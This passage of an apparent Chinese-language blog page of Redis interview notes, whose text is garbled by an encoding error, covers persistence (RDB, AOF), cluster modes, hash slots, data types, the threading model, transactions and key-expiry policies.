<li><code>redisæ”¯æŒæ›´ä¸°å¯Œçš„æ•°æ®ç±»å‹</code>ï¼ˆæ”¯æŒæ›´å¤æ‚çš„åº”ç”¨åœºæ™¯ï¼‰ï¼šRedisä¸ä»…ä»…æ”¯æŒç®€å•çš„k&#x2F;vç±»å‹çš„æ•°æ®ï¼ŒåŒæ—¶è¿˜æä¾›listï¼Œsetï¼Œzsetï¼Œhashç­‰æ•°æ®ç»“æ„çš„å­˜å‚¨ã€‚memcacheæ”¯æŒç®€å•çš„æ•°æ®ç±»å‹ï¼ŒStringã€‚</li>
<li><code>Redisæ”¯æŒæ•°æ®çš„æŒä¹…åŒ–</code>ï¼Œå¯ä»¥å°†å†…å­˜ä¸­çš„æ•°æ®ä¿æŒåœ¨ç£ç›˜ä¸­ï¼Œé‡å¯çš„æ—¶å€™å¯ä»¥å†æ¬¡åŠ è½½è¿›è¡Œä½¿ç”¨,è€ŒMemecacheæŠŠæ•°æ®å…¨éƒ¨å­˜åœ¨å†…å­˜ä¹‹ä¸­ã€‚</li>
<li><code>é›†ç¾¤æ¨¡å¼</code>ï¼šmemcachedæ²¡æœ‰åŸç”Ÿçš„é›†ç¾¤æ¨¡å¼ï¼Œéœ€è¦ä¾é å®¢æˆ·ç«¯æ¥å®ç°å¾€é›†ç¾¤ä¸­åˆ†ç‰‡å†™å…¥æ•°æ®ï¼›ä½†æ˜¯ redis ç›®å‰æ˜¯åŸç”Ÿæ”¯æŒ cluster æ¨¡å¼çš„.</li>
<li><code>Redisä½¿ç”¨å•çº¿ç¨‹</code>ï¼šMemcachedæ˜¯å¤šçº¿ç¨‹ï¼Œéé˜»å¡IOå¤ç”¨çš„ç½‘ç»œæ¨¡å‹ï¼›Redisä½¿ç”¨å•çº¿ç¨‹çš„å¤šè·¯ IO å¤ç”¨æ¨¡å‹ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142550.png" alt="1574821356723"></p>
<h2 id="4-2-Redisçš„æŒä¹…åŒ–æ–¹æ¡ˆç”±å“ªäº›ï¼Ÿ"><a href="#4-2-Redisçš„æŒä¹…åŒ–æ–¹æ¡ˆç”±å“ªäº›ï¼Ÿ" class="headerlink" title="4.2.Redisçš„æŒä¹…åŒ–æ–¹æ¡ˆç”±å“ªäº›ï¼Ÿ"></a>4.2.Redisçš„æŒä¹…åŒ–æ–¹æ¡ˆç”±å“ªäº›ï¼Ÿ</h2><p>Redisä¸»è¦æä¾›äº†ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ï¼ŒRDBå’ŒAOF:</p>
<h3 id="1ï¼‰RDBï¼š"><a href="#1ï¼‰RDBï¼š" class="headerlink" title="1ï¼‰RDBï¼š"></a>1ï¼‰RDBï¼š</h3><p>é»˜è®¤å¼€å¯ï¼Œæ»¡è¶³æ¡ä»¶æ—¶å°†å†…å­˜ä¸­çš„æ•°æ®å¿«ç…§åˆ°ç£ç›˜ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªdump.rdbæ–‡ä»¶ï¼ŒRediså¯åŠ¨æ—¶å†æ¢å¤åˆ°å†…å­˜ä¸­ã€‚</p>
<p>Redisä¼šå•ç‹¬åˆ›å»ºfork()ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå°†å½“å‰çˆ¶è¿›ç¨‹çš„æ•°æ®åº“æ•°æ®å¤åˆ¶åˆ°å­è¿›ç¨‹çš„å†…å­˜ä¸­ï¼Œç„¶åç”±å­è¿›ç¨‹å†™å…¥åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼ŒæŒä¹…åŒ–çš„è¿‡ç¨‹ç»“æŸäº†ï¼Œå†ç”¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶æ›¿æ¢ä¸Šæ¬¡çš„å¿«ç…§æ–‡ä»¶ï¼Œç„¶åå­è¿›ç¨‹é€€å‡ºï¼Œå†…å­˜é‡Šæ”¾ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯æ¬¡å¿«ç…§æŒä¹…åŒ–éƒ½ä¼šå°†ä¸»è¿›ç¨‹çš„æ•°æ®åº“æ•°æ®å¤åˆ¶ä¸€éï¼Œå¯¼è‡´å†…å­˜å¼€é”€åŠ å€ï¼Œè‹¥æ­¤æ—¶å†…å­˜ä¸è¶³ï¼Œåˆ™ä¼šé˜»å¡æœåŠ¡å™¨è¿è¡Œï¼Œç›´åˆ°å¤åˆ¶ç»“æŸé‡Šæ”¾å†…å­˜ï¼›éƒ½ä¼šå°†å†…å­˜æ•°æ®å®Œæ•´å†™å…¥ç£ç›˜ä¸€æ¬¡ï¼Œæ‰€ä»¥å¦‚æœæ•°æ®é‡å¤§çš„è¯ï¼Œè€Œä¸”å†™æ“ä½œé¢‘ç¹ï¼Œå¿…ç„¶ä¼šå¼•èµ·å¤§é‡çš„ç£ç›˜I&#x2F;Oæ“ä½œï¼Œä¸¥é‡å½±å“æ€§èƒ½ï¼Œå¹¶ä¸”æœ€åä¸€æ¬¡æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¼šä¸¢å¤±ï¼›</p>
<p>RDBç­–ç•¥é…ç½®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">save 900 1    #åœ¨900ç§’(15åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰1ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br><span class="line"></span><br><span class="line">save 300 10   #åœ¨300ç§’(5åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰10ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br><span class="line"></span><br><span class="line">save 60 10000 #åœ¨60ç§’(1åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰10000ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2ï¼‰AOF"><a href="#2ï¼‰AOF" class="headerlink" title="2ï¼‰AOF:"></a>2ï¼‰AOF:</h3><p>ä¸å¿«ç…§æŒä¹…åŒ–ç›¸æ¯”ï¼ŒAOFæŒä¹…åŒ– çš„å®æ—¶æ€§æ›´å¥½ï¼Œå› æ­¤å·²æˆä¸ºä¸»æµçš„æŒä¹…åŒ–æ–¹æ¡ˆã€‚é»˜è®¤æƒ…å†µä¸‹Redisæ²¡æœ‰å¼€å¯AOFï¼ˆappend only fileï¼‰æ–¹å¼çš„æŒä¹…åŒ–ï¼Œå¯ä»¥é€šè¿‡appendonlyå‚æ•°å¼€å¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<p>å¼€å¯AOFæŒä¹…åŒ–åæ¯æ‰§è¡Œä¸€æ¡ä¼šæ›´æ”¹Redisä¸­çš„æ•°æ®çš„å‘½ä»¤ï¼ŒRediså°±ä¼šå°†è¯¥å‘½ä»¤å†™å…¥ç¡¬ç›˜ä¸­çš„AOFæ–‡ä»¶ã€‚AOFæ–‡ä»¶çš„ä¿å­˜ä½ç½®å’ŒRDBæ–‡ä»¶çš„ä½ç½®ç›¸åŒï¼Œéƒ½æ˜¯é€šè¿‡dirå‚æ•°è®¾ç½®çš„ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯appendonly.aofã€‚</p>
<p>åœ¨Redisçš„é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨ä¸‰ç§ä¸åŒçš„ AOF æŒä¹…åŒ–æ–¹å¼ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendfsync always     <span class="comment">#æ¯æ¬¡æœ‰æ•°æ®ä¿®æ”¹å‘ç”Ÿæ—¶éƒ½ä¼šå†™å…¥AOFæ–‡ä»¶,è¿™æ ·ä¼šä¸¥é‡é™ä½Redisçš„é€Ÿåº¦</span></span><br><span class="line">appendfsync everysec  <span class="comment">#æ¯ç§’é’ŸåŒæ­¥ä¸€æ¬¡ï¼Œæ˜¾ç¤ºåœ°å°†å¤šä¸ªå†™å‘½ä»¤åŒæ­¥åˆ°ç¡¬ç›˜</span></span><br><span class="line">appendfsync no      <span class="comment">#è®©æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶è¿›è¡ŒåŒæ­¥</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†å…¼é¡¾æ•°æ®å’Œå†™å…¥æ€§èƒ½ï¼Œç”¨æˆ·å¯ä»¥è€ƒè™‘ appendfsync everysecé€‰é¡¹ ï¼Œè®©Redisæ¯ç§’åŒæ­¥ä¸€æ¬¡AOFæ–‡ä»¶ï¼ŒRedisæ€§èƒ½å‡ ä¹æ²¡å—åˆ°ä»»ä½•å½±å“ã€‚è€Œä¸”è¿™æ ·å³ä½¿å‡ºç°ç³»ç»Ÿå´©æºƒï¼Œç”¨æˆ·æœ€å¤šåªä¼šä¸¢å¤±ä¸€ç§’ä¹‹å†…äº§ç”Ÿçš„æ•°æ®ã€‚å½“ç¡¬ç›˜å¿™äºæ‰§è¡Œå†™å…¥æ“ä½œçš„æ—¶å€™ï¼ŒRedisè¿˜ä¼šä¼˜é›…çš„æ”¾æ…¢è‡ªå·±çš„é€Ÿåº¦ä»¥ä¾¿é€‚åº”ç¡¬ç›˜çš„æœ€å¤§å†™å…¥é€Ÿåº¦ã€‚</p>
<h2 id="4-3-Redisçš„é›†ç¾¤æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"><a href="#4-3-Redisçš„é›†ç¾¤æ–¹å¼æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="4.3.Redisçš„é›†ç¾¤æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"></a>4.3.Redisçš„é›†ç¾¤æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</h2><h3 id="1ï¼‰ä¸»ä»é›†ç¾¤"><a href="#1ï¼‰ä¸»ä»é›†ç¾¤" class="headerlink" title="1ï¼‰ä¸»ä»é›†ç¾¤"></a>1ï¼‰ä¸»ä»é›†ç¾¤</h3><p>ä¸»ä»é›†ç¾¤ï¼Œä¹Ÿæ˜¯è¯»å†™åˆ†ç¦»é›†ç¾¤ã€‚ä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸»å¤šä»æ–¹å¼ã€‚</p>
<p>Redis çš„å¤åˆ¶ï¼ˆreplicationï¼‰åŠŸèƒ½å…è®¸ç”¨æˆ·æ ¹æ®ä¸€ä¸ª Redis æœåŠ¡å™¨æ¥åˆ›å»ºä»»æ„å¤šä¸ªè¯¥æœåŠ¡å™¨çš„å¤åˆ¶å“ï¼Œå…¶ä¸­è¢«å¤åˆ¶çš„æœåŠ¡å™¨ä¸ºä¸»æœåŠ¡å™¨ï¼ˆmasterï¼‰ï¼Œè€Œé€šè¿‡å¤åˆ¶åˆ›å»ºå‡ºæ¥çš„æœåŠ¡å™¨å¤åˆ¶å“åˆ™ä¸ºä»æœåŠ¡å™¨ï¼ˆslaveï¼‰ã€‚</p>
<p>åªè¦ä¸»ä»æœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œè¿æ¥æ­£å¸¸ï¼Œä¸»ä»æœåŠ¡å™¨ä¸¤è€…ä¼šå…·æœ‰ç›¸åŒçš„æ•°æ®ï¼Œä¸»æœåŠ¡å™¨å°±ä¼šä¸€ç›´å°†å‘ç”Ÿåœ¨è‡ªå·±èº«ä¸Šçš„æ•°æ®æ›´æ–°åŒæ­¥ ç»™ä»æœåŠ¡å™¨ï¼Œä»è€Œä¸€ç›´ä¿è¯ä¸»ä»æœåŠ¡å™¨çš„æ•°æ®ç›¸åŒã€‚</p>
<ul>
<li>å†™æ•°æ®æ—¶åªèƒ½é€šè¿‡ä¸»èŠ‚ç‚¹å®Œæˆ</li>
<li>è¯»æ•°æ®å¯ä»¥ä»ä»»ä½•èŠ‚ç‚¹å®Œæˆ</li>
<li>å¦‚æœé…ç½®äº†<code>å“¨å…µèŠ‚ç‚¹</code>ï¼Œå½“masterå®•æœºæ—¶ï¼Œå“¨å…µä¼šä»salveèŠ‚ç‚¹é€‰å‡ºä¸€ä¸ªæ–°çš„ä¸»ã€‚</li>
</ul>
<p>ä¸»ä»é›†ç¾¤åˆ†ä¸¤ç§ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142551.png" alt="1574821993599"> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142552.png" alt="1574822026037"> </p>
<p>å¸¦æœ‰å“¨å…µçš„é›†ç¾¤ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142553.png" alt="1574822077190"></p>
<h3 id="2ï¼‰åˆ†ç‰‡é›†ç¾¤"><a href="#2ï¼‰åˆ†ç‰‡é›†ç¾¤" class="headerlink" title="2ï¼‰åˆ†ç‰‡é›†ç¾¤"></a>2ï¼‰åˆ†ç‰‡é›†ç¾¤</h3><p>ä¸»ä»é›†ç¾¤ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½è¦ä¿å­˜æ‰€æœ‰ä¿¡æ¯ï¼Œå®¹æ˜“å½¢æˆæœ¨æ¡¶æ•ˆåº”ã€‚å¹¶ä¸”å½“æ•°æ®é‡è¾ƒå¤§æ—¶ï¼Œå•ä¸ªæœºå™¨æ— æ³•æ»¡è¶³éœ€æ±‚ã€‚æ­¤æ—¶æˆ‘ä»¬å°±è¦ä½¿ç”¨åˆ†ç‰‡é›†ç¾¤äº†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142554.png" alt="1574822184467"> </p>
<p>é›†ç¾¤ç‰¹å¾ï¼š</p>
<ul>
<li><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜ä¸åŒæ•°æ®</p>
</li>
<li><p>æ‰€æœ‰çš„redisèŠ‚ç‚¹å½¼æ­¤äº’è”(PING-PONGæœºåˆ¶),å†…éƒ¨ä½¿ç”¨äºŒè¿›åˆ¶åè®®ä¼˜åŒ–ä¼ è¾“é€Ÿåº¦å’Œå¸¦å®½.</p>
</li>
<li><p>èŠ‚ç‚¹çš„failæ˜¯é€šè¿‡é›†ç¾¤ä¸­è¶…è¿‡åŠæ•°çš„èŠ‚ç‚¹æ£€æµ‹å¤±æ•ˆæ—¶æ‰ç”Ÿæ•ˆ.</p>
</li>
<li><p>å®¢æˆ·ç«¯ä¸redisèŠ‚ç‚¹ç›´è¿,ä¸éœ€è¦ä¸­é—´proxyå±‚è¿æ¥é›†ç¾¤ä¸­ä»»ä½•ä¸€ä¸ªå¯ç”¨èŠ‚ç‚¹éƒ½å¯ä»¥è®¿é—®åˆ°æ•°æ®</p>
</li>
<li><p>redis-clusteræŠŠæ‰€æœ‰çš„ç‰©ç†èŠ‚ç‚¹æ˜ å°„åˆ°[0-16383]slotï¼ˆæ’æ§½ï¼‰ä¸Šï¼Œå®ç°åŠ¨æ€ä¼¸ç¼©</p>
</li>
</ul>
<p>ä¸ºäº†ä¿è¯Redisä¸­æ¯ä¸ªèŠ‚ç‚¹çš„é«˜å¯ç”¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç»™æ¯ä¸ªèŠ‚ç‚¹åˆ›å»ºreplicationï¼ˆslaveèŠ‚ç‚¹ï¼‰ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142555.png" alt="1574822584357"></p>
<p>å‡ºç°æ•…éšœæ—¶ï¼Œä¸»ä»å¯ä»¥åŠæ—¶åˆ‡æ¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142556.png" alt="1574822602109"></p>
<h2 id="4-4-Redisçš„åˆ†ç‰‡é›†ç¾¤å¦‚ä½•åšåˆ°é›†ç¾¤åŠ¨æ€ä¼¸ç¼©ï¼ˆhashæ§½åŸç†ï¼‰"><a href="#4-4-Redisçš„åˆ†ç‰‡é›†ç¾¤å¦‚ä½•åšåˆ°é›†ç¾¤åŠ¨æ€ä¼¸ç¼©ï¼ˆhashæ§½åŸç†ï¼‰" class="headerlink" title="4.4.Redisçš„åˆ†ç‰‡é›†ç¾¤å¦‚ä½•åšåˆ°é›†ç¾¤åŠ¨æ€ä¼¸ç¼©ï¼ˆhashæ§½åŸç†ï¼‰"></a>4.4.Redisçš„åˆ†ç‰‡é›†ç¾¤å¦‚ä½•åšåˆ°é›†ç¾¤åŠ¨æ€ä¼¸ç¼©ï¼ˆhashæ§½åŸç†ï¼‰</h2><p>åˆ›å»ºé›†ç¾¤æ—¶ï¼ŒRedisä¼šå°†16384ä¸ªæ’æ§½åˆ†é…åˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚</p>
<p>redisé›†ç¾¤å­˜å‚¨æ•°æ®æ—¶ï¼Œä¼šæ ¹æ®keyè®¡ç®—æ’æ§½å€¼ï¼Œåˆ©ç”¨keyçš„<code>æœ‰æ•ˆéƒ¨åˆ†</code>ä½¿ç”¨CRC16ç®—æ³•è®¡ç®—å‡ºå“ˆå¸Œå€¼ï¼Œå†å°†å“ˆå¸Œå€¼å¯¹16384å–ä½™ï¼Œå¾—åˆ°æ’æ§½å€¼ã€‚</p>
<p><strong>æ’æ§½åœ¨å“ªä¸ªèŠ‚ç‚¹ï¼Œæ•°æ®å°±è·Ÿéšåˆ°å“ªä¸ªå‡ ç‚¹ï¼Œå› æ­¤æ•°æ®æ—¶è·Ÿæ’æ§½ç»‘å®šï¼Œè€Œä¸æ˜¯å…·ä½“çš„æœºå™¨</strong>ã€‚</p>
<p>å½“é›†ç¾¤ä¸­æœ‰æ–°çš„æœºå™¨åŠ å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°åˆ†é…æ’æ§½ï¼ŒRedisä¼šè‡ªåŠ¨æŠŠå¯¹åº”æ’æ§½çš„æ•°æ®åŒæ­¥åˆ°æ–°çš„èŠ‚ç‚¹ã€‚</p>
<h2 id="4-5-Redisçš„å¸¸ç”¨æ•°æ®ç±»å‹æœ‰å“ªäº›ï¼Ÿ"><a href="#4-5-Redisçš„å¸¸ç”¨æ•°æ®ç±»å‹æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="4.5.Redisçš„å¸¸ç”¨æ•°æ®ç±»å‹æœ‰å“ªäº›ï¼Ÿ"></a>4.5.Redisçš„å¸¸ç”¨æ•°æ®ç±»å‹æœ‰å“ªäº›ï¼Ÿ</h2><p>æ”¯æŒå¤šç§ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦åŒºåˆ«æ˜¯valueå­˜å‚¨çš„æ•°æ®æ ¼å¼ä¸åŒï¼š</p>
<ul>
<li><p>stringï¼šæœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼ŒäºŒè¿›åˆ¶å®‰å…¨çš„å­—ç¬¦ä¸²ï¼Œæœ€å¤§512Mã€‚</p>
</li>
<li><p>listï¼šæŒ‰ç…§æ·»åŠ é¡ºåºä¿æŒé¡ºåºçš„å­—ç¬¦ä¸²åˆ—è¡¨ã€‚</p>
</li>
<li><p>setï¼šæ— åºçš„å­—ç¬¦ä¸²é›†åˆï¼Œä¸å­˜åœ¨é‡å¤çš„å…ƒç´ ã€‚</p>
</li>
<li><p>sorted setï¼šå·²æ’åºçš„å­—ç¬¦ä¸²é›†åˆã€‚</p>
</li>
<li><p>hashï¼škey-valueå¯¹æ ¼å¼</p>
</li>
</ul>
<h2 id="4-6-Redisæ˜¯å•çº¿ç¨‹ï¼Œä¸ºä»€ä¹ˆå¹¶å‘èƒ½åŠ›è¿™ä¹ˆå¼º"><a href="#4-6-Redisæ˜¯å•çº¿ç¨‹ï¼Œä¸ºä»€ä¹ˆå¹¶å‘èƒ½åŠ›è¿™ä¹ˆå¼º" class="headerlink" title="4.6.Redisæ˜¯å•çº¿ç¨‹ï¼Œä¸ºä»€ä¹ˆå¹¶å‘èƒ½åŠ›è¿™ä¹ˆå¼º?"></a>4.6.Redisæ˜¯å•çº¿ç¨‹ï¼Œä¸ºä»€ä¹ˆå¹¶å‘èƒ½åŠ›è¿™ä¹ˆå¼º?</h2><p>ç­”ï¼š</p>
<p>å•çº¿ç¨‹å¯ä»¥å¸¦æ¥ä¸‹åˆ—å¥½å¤„ï¼š</p>
<p>1ï¼‰ç»å¤§éƒ¨åˆ†è¯·æ±‚æ˜¯çº¯ç²¹çš„å†…å­˜æ“ä½œï¼ˆéå¸¸å¿«é€Ÿï¼‰</p>
<p>2ï¼‰é‡‡ç”¨å•çº¿ç¨‹,é¿å…äº†ä¸å¿…è¦çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œç«äº‰æ¡ä»¶</p>
<p>3ï¼‰é‡‡ç”¨éé˜»å¡IOï¼Œåˆ©ç”¨äº†IOå¤šè·¯å¤ç”¨çš„ç‰¹æ€§ã€‚</p>
<p>ç®€è¿°IOå¤šè·¯å¤ç”¨çš„æ¨¡å‹ï¼š</p>
<p>é¦–å…ˆï¼ŒRedisçº¿ç¨‹æ¨¡å‹åŒ…æ‹¬ä¸‹é¢å‡ ä¸ªæ¦‚å¿µï¼š</p>
<ul>
<li>å¥—æ¥å­—ï¼ˆSocket)ï¼šç”¨æˆ·è¯·æ±‚å¥—æ¥å­—å¯¹è±¡</li>
<li>I&#x2F;O å¤šè·¯å¤ç”¨ç¨‹åºï¼šç›‘å¬å®¢æˆ·ç«¯Socketï¼Œå¹¶æœªå®¢æˆ·ç«¯ç»‘å®šäº‹ä»¶å¤„ç†å™¨</li>
<li>æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ï¼ˆdispatcherï¼‰ï¼šæ ¹æ®å®¢æˆ·ç«¯ç›®å‰çŠ¶æ€ä¸åŒï¼Œåˆ†å‘ä¸åŒçš„äº‹ä»¶å¤„ç†å™¨å¤„ç†</li>
<li>äº‹ä»¶å¤„ç†å™¨ï¼šå¤„ç†ç”¨æˆ·å…·ä½“æ“ä½œäº‹ä»¶ï¼ŒåŒ…æ‹¬ï¼šæ¥æ”¶å¥—æ¥å­—ï¼ˆacceptï¼‰ã€è¯»å–ï¼ˆreadï¼‰ã€å†™å…¥ï¼ˆwriteï¼‰ã€å…³é—­ï¼ˆcloseï¼‰ç­‰æ“ä½œçš„å¤„ç†å™¨</li>
</ul>
<p>å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142557.png" alt="1574819020635"></p>
<h2 id="4-7-èŠä¸€ä¸‹Redisäº‹åŠ¡æœºåˆ¶"><a href="#4-7-èŠä¸€ä¸‹Redisäº‹åŠ¡æœºåˆ¶" class="headerlink" title="4.7.èŠä¸€ä¸‹Redisäº‹åŠ¡æœºåˆ¶"></a>4.7.èŠä¸€ä¸‹Redisäº‹åŠ¡æœºåˆ¶</h2><p>Redisäº‹åŠ¡åŠŸèƒ½æ˜¯é€šè¿‡MULTIã€EXECã€DISCARDå’ŒWATCH å››ä¸ªåŸè¯­å®ç°çš„ã€‚Redisä¼šå°†ä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤åºåˆ—åŒ–ï¼Œç„¶åæŒ‰é¡ºåºæ‰§è¡Œã€‚ä½†æ˜¯Redisäº‹åŠ¡ä¸æ”¯æŒå›æ»šæ“ä½œï¼Œå‘½ä»¤è¿è¡Œå‡ºé”™åï¼Œæ­£ç¡®çš„å‘½ä»¤ä¼šç»§ç»­æ‰§è¡Œã€‚</p>
<ul>
<li><code>MULTI</code>: ç”¨äºå¼€å¯ä¸€ä¸ªäº‹åŠ¡ï¼Œå®ƒæ€»æ˜¯è¿”å›OKã€‚ MULTIæ‰§è¡Œä¹‹åï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘æœåŠ¡å™¨å‘é€ä»»æ„å¤šæ¡å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¸ä¼šç«‹å³è¢«æ‰§è¡Œï¼Œè€Œæ˜¯è¢«æ”¾åˆ°ä¸€ä¸ªé˜Ÿåˆ—ä¸­</li>
<li><code>EXEC</code>ï¼šæ‰§è¡Œæ‰€æœ‰äº‹åŠ¡å—å†…çš„å‘½ä»¤ã€‚è¿”å›äº‹åŠ¡å—å†…æ‰€æœ‰å‘½ä»¤çš„è¿”å›å€¼ï¼ŒæŒ‰å‘½ä»¤æ‰§è¡Œçš„å…ˆåé¡ºåºæ’åˆ—ã€‚ å½“æ“ä½œè¢«æ‰“æ–­æ—¶ï¼Œè¿”å›ç©ºå€¼ nil </li>
<li><code>DISCARD</code>ï¼šæ¸…ç©ºäº‹åŠ¡é˜Ÿåˆ—ï¼Œå¹¶æ”¾å¼ƒæ‰§è¡Œäº‹åŠ¡ï¼Œ å¹¶ä¸”å®¢æˆ·ç«¯ä¼šä»äº‹åŠ¡çŠ¶æ€ä¸­é€€å‡º</li>
<li>WATCHï¼šRedisçš„ä¹è§‚é”æœºåˆ¶ï¼Œåˆ©ç”¨compare-and-setï¼ˆCASï¼‰åŸç†ï¼Œå¯ä»¥ç›‘æ§ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œä¸€æ—¦å…¶ä¸­æœ‰ä¸€ä¸ªé”®è¢«ä¿®æ”¹ï¼ˆæˆ–åˆ é™¤ï¼‰ï¼Œä¹‹åçš„äº‹åŠ¡å°±ä¸ä¼šæ‰§è¡Œ</li>
</ul>
<h2 id="4-8-Redisçš„Keyè¿‡æœŸç­–ç•¥"><a href="#4-8-Redisçš„Keyè¿‡æœŸç­–ç•¥" class="headerlink" title="4.8.Redisçš„Keyè¿‡æœŸç­–ç•¥"></a>4.8.Redisçš„Keyè¿‡æœŸç­–ç•¥</h2><p>Redisæ˜¯å†…å­˜å­˜å‚¨ï¼Œå¦‚æœkeyæ°¸ä¸è¿‡æœŸï¼Œå°±ä¼šå¯¼è‡´å†…å­˜å ç”¨è¶Šæ¥è¶Šå¤šï¼Œå› æ­¤ä¼šé‡‡ç”¨ï¼šå®šæœŸåˆ é™¤ã€æƒ°æ€§åˆ é™¤ç»“åˆå†…å­˜çš„æ·˜æ±°æœºåˆ¶æ¥æ¸…ç†å†…å­˜ã€‚</p>
<ul>
<li>å®šæœŸåˆ é™¤ï¼šredisé»˜è®¤æ¯éš”100msæ£€æŸ¥ï¼Œæ˜¯å¦æœ‰è¿‡æœŸçš„key,æœ‰è¿‡æœŸkeyåˆ™åˆ é™¤ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œredisä¸æ˜¯æ¯ä¸ª100mså°†æ‰€æœ‰çš„keyæ£€æŸ¥ä¸€æ¬¡ï¼Œè€Œæ˜¯éšæœºæŠ½å–è¿›è¡Œæ£€æŸ¥ï¼Œå› ä¸ºå¦‚æœå¯¹å…¨éƒ¨keyæ£€æŸ¥ï¼Œä¼šå ç”¨è¿‡å¤šèµ„æºã€‚å› æ­¤ï¼Œæ²¡æœ‰æŠ½æŸ¥åˆ°çš„keyå°±ä¸ä¼šåˆ é™¤ï¼Œè¿™æ ·å†…å­˜å ç”¨ä¾ç„¶ä¼šè¶Šæ¥è¶Šå¤š</li>
<li>æƒ°æ€§åˆ é™¤ï¼šå½“è·å–æŸä¸ªkeyçš„æ—¶å€™ï¼Œredisä¼šæ£€æŸ¥ä¸€ä¸‹keyæ˜¯å¦æœ‰è¿‡æœŸæ—¶é—´ï¼Œæ˜¯å¦å·²ç»è¿‡æœŸï¼Œå¦‚æœè¿‡æœŸå°±ä¼šåˆ é™¤</li>
</ul>
<p>ä½†æ˜¯ä¾æ®ä¸Šé¢çš„ä¸¤ç§ç­–ç•¥ï¼Œä¾ç„¶ä¼šæœ‰æ¼ç½‘ä¹‹é±¼ï¼ˆæ¯”å¦‚è¿‡æœŸäº†ï¼Œä¸€ç›´æ²¡æœ‰è¢«æŠ½æŸ¥åˆ°ï¼Œä¹Ÿæ²¡æœ‰äººè®¿é—®çš„key)ï¼Œè¿™æ ·å†…å­˜ä¹Ÿä¼šè€—å°½ã€‚</p>
<p>å› æ­¤å½“rediså†…å­˜ä¸è¶³æ—¶ï¼Œä¼šé‡‡ç”¨æ·˜æ±°æœºåˆ¶ï¼Œåˆ é™¤ä¸€äº›Keyï¼ŒåŒ…æ‹¬ä¸‹é¢çš„ç­–ç•¥ï¼š</p>
<ul>
<li>volatile-lruï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°</li>
<li>volatile-ttlï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­æŒ‘é€‰å°†è¦è¿‡æœŸçš„æ•°æ®æ·˜æ±°</li>
